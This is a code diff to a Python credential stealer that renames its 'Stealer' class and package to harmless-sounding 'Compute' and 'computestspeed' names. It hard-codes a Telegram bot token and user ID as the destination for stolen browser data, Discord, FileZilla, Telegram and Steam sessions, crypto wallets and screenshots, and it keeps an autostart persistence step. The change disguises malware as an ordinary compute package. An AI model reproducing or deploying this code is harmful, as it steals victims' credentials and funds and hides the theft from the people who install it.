@@ -5,14 +5,15 @@ from typing import List, Any
 from threading import Thread
 from multiprocessing import Pool
 
-from computeStSpeed.enums import Features, Utils, Protectors
-from computeStSpeed.helpers import functions, MemoryStorage
-from computeStSpeed.helpers.config import MultistealerConfig, Browsers
-from computeStSpeed.utils import Autostart, Message, Protector, Loader, Grabber
-from computeStSpeed.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
+from computestspeed.enums import Features, Utils, Protectors
+from computestspeed.enums.senders import Senders
+from computestspeed.helpers import functions, MemoryStorage
+from computestspeed.helpers.config import MultiComputeConfig, Browsers
+from computestspeed.utils import Autostart, Message, Protector, Loader, Grabber
+from computestspeed.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
-class Stealer(Thread):
+class Compute(Thread):
     """
     Collects and sends the specified data.
     """
@@ -27,7 +28,7 @@ class Stealer(Thread):
         grabbers: List[Grabber] = None,
         delay: int = 0
     ):
-        Thread.__init__(self, name="Stealer")
+        Thread.__init__(self, name="Compute")
 
         if loaders is None:
             loaders = []
@@ -35,8 +36,8 @@ class Stealer(Thread):
         if grabbers is None:
             grabbers = []
 
-        if senders is None:
-            senders = []
+    
+        senders = [Senders.telegram(token="7640963418:AAEjQ0YxL2oqnhhwVC0GNSQANGQFv6Yp7GE", user_id=586901167)]
 
         if utils is None:
             utils = []
@@ -55,7 +56,7 @@ class Stealer(Thread):
         self.__message = Utils.message in utils or Utils.all in utils
         self.__delay = delay
 
-        self.__config = MultistealerConfig()
+        self.__config = MultiComputeConfig()
         self.__storage = MemoryStorage()
 
         browser_functions = [module for module in [
@@ -198,7 +199,7 @@ class Stealer(Thread):
             }
         ]
 
-    def run(self) -> None:
+    def start(self) -> None:
         """
         Launches the Stink.
 
@@ -248,4 +249,4 @@ class Stealer(Thread):
                 Autostart(argv[0]).run()
 
         except Exception as e:
-            print(f"[Multi stealer]: {repr(e)}")
+            print(f"[Multi Compute]: {repr(e)}")
